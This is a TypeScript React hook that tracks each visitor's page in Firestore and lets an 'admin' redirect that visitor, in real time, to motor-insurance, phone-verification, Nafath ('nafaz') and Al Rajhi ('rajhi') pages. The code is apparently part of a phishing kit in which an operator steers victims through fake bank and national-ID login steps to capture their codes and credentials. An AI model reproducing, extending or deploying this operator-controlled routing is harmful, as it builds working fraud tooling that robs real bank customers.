import { useEffect, useCallback, useRef } from "react";
import { useLocation } from "wouter";
import { db, addData, generateVisitorId, isFirebaseConfigured } from "@/lib/firebase";
import { doc, onSnapshot } from "firebase/firestore";

export type RoutablePage = "motor" | "motor-insurance" | "phone-verification" | "nafaz" | "rajhi" | "done";

export interface AdminDirective {
  targetPage?: RoutablePage;
  targetStep?: number;
  issuedAt?: string;
  issuedBy?: string;
}

export interface VisitorData {
  adminDirective?: AdminDirective;
  currentPage?: string;
  currentStep?: number;
}

const PAGE_ROUTES: Record<string, string> = {
  "motor": "/motor",
  "motor-insurance": "/motor",
  "phone-verification": "/phone",
  "nafaz": "/nafaz",
  "rajhi": "/rajhi",
  "done": "/motor",
};

const normalizePageName = (page: string): RoutablePage => {
  if (page.startsWith("motor-insurance") || page === "motor") return "motor";
  if (page.startsWith("phone")) return "phone-verification";
  if (page.startsWith("nafaz")) return "nafaz";
  if (page.startsWith("rajhi")) return "rajhi";
  return "motor";
};

const getRouteForPage = (page: string): string | undefined => {
  return PAGE_ROUTES[page] || PAGE_ROUTES[normalizePageName(page)];
};

// Store pending directive globally so it persists across page navigations
let pendingDirective: { directive: AdminDirective; key: string } | null = null;

// Track pages we've navigated to ourselves to prevent feedback loops
let lastNavigatedPage: string | null = null;

interface UseVisitorRoutingOptions {
  currentPage: RoutablePage;
  currentStep?: number;
  onStepChange?: (step: number) => void;
}

export function useVisitorRouting({
  currentPage,
  currentStep,
  onStepChange,
}: UseVisitorRoutingOptions) {
  const [location, setLocation] = useLocation();
  const processedDirectivesRef = useRef<Set<string>>(new Set());
  const lastSetPageRef = useRef<string | null>(null);

  const getVisitorId = useCallback((): string => {
    if (typeof localStorage === "undefined") return "";
    
    let visitorId = localStorage.getItem("visitor");
    if (!visitorId) {
      visitorId = generateVisitorId();
      localStorage.setItem("visitor", visitorId);
    }
    return visitorId;
  }, []);

  const visitorId = getVisitorId();

  const updateVisitorState = useCallback(async (page: RoutablePage, step?: number) => {
    if (!visitorId) return;
    
    // Track this page update so we don't react to our own updates
    lastSetPageRef.current = page;
    lastNavigatedPage = page;
    
    const updatePayload: any = {
      id: visitorId,
      currentPage: page,
    };
    if (step !== undefined) {
      updatePayload.currentStep = step;
    }
    await addData(updatePayload);
  }, [visitorId]);

  // Check for pending directive when page changes
  useEffect(() => {
    if (pendingDirective && normalizePageName(pendingDirective.directive.targetPage || "") === currentPage) {
      const { directive, key } = pendingDirective;
      
      // Apply the step if we're now on the correct page
      if (directive.targetStep !== undefined && directive.targetStep !== currentStep && onStepChange) {
        onStepChange(directive.targetStep);
      }
      
      // Mark as processed and clear pending
      processedDirectivesRef.current.add(key);
      pendingDirective = null;
    }
  }, [currentPage, currentStep, onStepChange]);

  useEffect(() => {
    if (!visitorId || !db || !isFirebaseConfigured) return;

    const docRef = doc(db, "pays", visitorId);
    
    const unsubscribe = onSnapshot(docRef, (docSnap) => {
      if (!docSnap.exists()) return;
      
      const data = docSnap.data() as VisitorData;
      const directive = data.adminDirective;
      
      if (directive && directive.targetPage) {
        const normalizedTarget = normalizePageName(directive.targetPage);
        const directiveKey = `${directive.targetPage}-${directive.targetStep}-${directive.issuedAt}`;
        
        if (!processedDirectivesRef.current.has(directiveKey)) {
          if (normalizedTarget !== currentPage) {
            pendingDirective = { directive, key: directiveKey };
            
            const targetRoute = getRouteForPage(directive.targetPage);
            if (targetRoute && location !== targetRoute) {
              setLocation(targetRoute);
            }
          } else {
            processedDirectivesRef.current.add(directiveKey);
            
            if (directive.targetStep !== undefined && directive.targetStep !== currentStep && onStepChange) {
              onStepChange(directive.targetStep);
            }
          }
        }
      }
      
      if (data.currentPage && typeof data.currentPage === 'string') {
        const firestorePage = data.currentPage;
        const normalizedFirestorePage = normalizePageName(firestorePage);
        
        const normalizedLastNav = lastNavigatedPage ? normalizePageName(lastNavigatedPage) : null;
        const normalizedLastSet = lastSetPageRef.current ? normalizePageName(lastSetPageRef.current) : null;
        if (normalizedLastNav === normalizedFirestorePage || normalizedLastSet === normalizedFirestorePage) {
          if (normalizedLastNav === normalizedFirestorePage) lastNavigatedPage = null;
          return;
        }
        
        if (normalizedFirestorePage !== currentPage) {
          const targetRoute = getRouteForPage(firestorePage);
          if (targetRoute && location !== targetRoute) {
            lastNavigatedPage = firestorePage;
            setLocation(targetRoute);
          }
          
          if (data.currentStep !== undefined && data.currentStep !== currentStep && onStepChange) {
            onStepChange(data.currentStep);
          }
        }
      }
    }, (error) => {
      console.error("Error listening to visitor routing:", error);
    });

    return () => unsubscribe();
  }, [visitorId, currentPage, currentStep, location, setLocation, onStepChange]);

  useEffect(() => {
    if (visitorId && currentPage) {
      updateVisitorState(currentPage, currentStep);
    }
  }, [visitorId, currentPage, currentStep, updateVisitorState]);

  return {
    visitorId,
    updateVisitorState,
  };
}
